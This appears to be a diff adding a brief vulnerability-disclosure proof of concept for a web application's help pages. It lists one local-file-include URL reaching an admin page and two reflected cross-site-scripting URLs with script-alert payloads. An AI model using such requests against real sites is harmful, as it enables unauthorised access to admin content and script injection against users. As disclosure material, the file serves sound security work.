@@ -1,0 +1,8 @@
+For the local-file include issue:
+
+http://www.example.com/user/help/help.shtml?/admin/this_server/this_server.shtml
+
+For the cross-site-scripting issues:
+
+http://www.example.com/user/help/help.shtml?&lt;script&gt;alert(&#039;DSecRG XSS&#039;)&lt;/script&gt;
+http://www.example.com/user/help/general_help_user.shtml?&lt;script&gt;alert(&#039;DSecRG XSS&#039;)&lt;/script&gt;
